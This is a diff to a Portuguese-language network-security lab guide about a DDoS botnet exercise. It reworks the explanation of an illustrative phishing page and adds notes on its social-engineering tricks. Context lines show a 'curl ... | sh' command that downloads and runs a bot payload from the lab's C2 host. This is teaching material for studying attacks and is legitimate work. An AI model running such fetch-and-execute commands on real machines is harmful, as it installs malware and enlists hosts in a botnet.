@@ -110,7 +110,8 @@ Ao carregar a página do controlador, você visualizará um conteúdo similar ao
 
 ![lab04-ddos-c2c-phishing.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-c2c-phishing.png)
 
-Essa é uma página ilustrativa com um golpe de fraude eletrônica (_Phishing_) que visa iludir o usuário a acreditar que está instalando um software seguro mas está instalando na verdade um malware, transformando seu computador em um **bot**. Para isso, a página instrui o usuário a copiar e executar um comando no seu computador (**Atenção:** este é um dos riscos de instalar software de procedência desconhecida, ou executar comandos em sites sem confiança).
+> [!NOTE]
+> A página exibida acima ilustra um suposto golpe de fraude eletrônica (_Phishing_) que visa iludir o usuário a acreditar que está instalando um software seguro mas está instalando na verdade um malware, transformando seu computador em um **bot**. Para isso, a página instrui o usuário a copiar e executar um comando no seu computador (**Atenção:** este é um dos riscos de instalar software de procedência desconhecida, ou executar comandos em sites sem confiança). A página contém elementos de Engenharia Social para convencer o usuário a cair no golpe.
 
 Em particular, no cenário ilustrativo e didático desse laboratório, vamos assumir que algumas pessoas foram vítimas desse golpe e vamos simular dois computadores sendo também infectados.
 
@@ -156,6 +157,10 @@ curl -sfL http://192.168.1.250:5000/s/download-vpn | sh
 Saída esperada é mostrada abaixo:
 
 ![lab04-ddos-host-infection-h6.png](https://raw.githubusercontent.com/hackinsdn/labs/refs/heads/feat/lab04-ddos/lab04-ddos/images/lab04-ddos-host-infection-h6.png)
+
+> [!NOTE]
+> Perceba que a saída acima contém novos elementos de Engenharia Social que visam fazer com que o usuário não desconfie que caiu em uma fraude.
+
 
 Na console admin do c2c, após um refresh da página podemos visualizar que o h6 agora também faz parte da botnet:
 
